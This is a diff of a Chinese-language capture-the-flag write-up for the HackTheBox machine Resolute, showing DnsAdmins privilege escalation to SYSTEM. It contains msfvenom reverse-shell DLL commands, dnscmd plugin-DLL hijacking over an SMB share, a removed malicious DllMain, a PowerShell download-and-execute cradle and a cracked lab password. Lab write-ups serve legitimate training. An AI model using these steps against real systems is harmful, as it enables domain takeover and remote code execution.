@@ -383,7 +383,7 @@ SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Se
 SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Serv3r4Admin4cc123! STATUS_LOGON_FAILURE 
 SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
 ```
-
+# 提权
 
 拿到一个新的shell
 ```
@@ -445,76 +445,89 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 
+留意当前用户在DnsAdmins用户组，此用户组可导致域权限提升，参考[这里](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 
-DLL利用代码：
+
+编译一个dll payload
 ```
-#include <windows.h>
-
-BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-    if (dwReason == DLL_PROCESS_ATTACH) {
-        system("cmd.exe /k net localgroup administrators ryan /add");
-        ExitProcess(0);
-    }
-    return TRUE;
-}
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443  -f dll -o shell.dll
 ```
 
 
-枚举域计算机
+
+在linux创建一个临时smb分享目录,文件夹：share
 ```
-*Evil-WinRM* PS C:\Users\ryan\Documents> Get-DomainComputer|select cn
-
-cn
---
-RESOLUTE
-MS02
-
+/usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support 
 ```
 
-
-在linux创建一个临时smb分享目录,文件夹：share，用户名：max，密码：s3cureP@ssword 
-```
-/usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support ./Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
-```
-
-在windows连接这个这个smb服务
+在windows连接这个这个smb服务,已可以连接
 
 ```
-net use \\10.10.16.4\share  /USER:max s3cureP@ssword
+Evil-WinRM* PS C:\Users\ryan\Documents> net use \\10.10.16.2\share 
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\ryan\Documents> ls \\10.10.16.2\share\shell.dll
+
+
+    Directory: \\10.10.16.2\share
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         9/5/2022   7:41 PM           8704 shell.dll
+
 ```
 
+使用配置文件，链接dns的dll文件到我们的UNC路径
 
- Find-DomainShare -ComputerDomain megabank.local -CheckShareAccess
-
-
-dnscmd Resolute /config /serverlevelplugindll C:\Users\ryan\Documents\hijackme.dll
-
-
-sc.exe  stop dns
-
-sc.exe  start dns
-
-
-
-evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!' 
-
-
-crackmapexec smb 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!' --shares
-
-
- Find-DomainShare -ComputerDomain megabank.local -CheckShareAccess
-
-拿到一个CS Beacon
+**后面这几步我尝试好几次才成功，注意所有配置的更改都会在一分钟内被还原**
 ```
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.16.4:80/a'))"
+*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.4\share\shell.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
 ```
 
+重启服务
+```
+*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\Resolute stop dns
 
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f psh-cmd 
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0x7530
+*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\Resolute start dns
 
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 4060
+        FLAGS              :
 
+```
 
-Get-DomainGroupMember -Identity "Pre-Windows 2000 Compatible Access" | select MemberDistinguishedName
+收到rev shell，已经是system权限
+```
+┌──(root💀kali)-[~/htb/Resolute]
+└─# nc -lnvp 443                                                                                                1 ⨯
+listening on [any] 443 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.169] 54097
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
+C:\Windows\system32>whoami
+whoami
+nt authority\system
 
-findstr /si password *.txt
+C:\Windows\system32>
+
+```
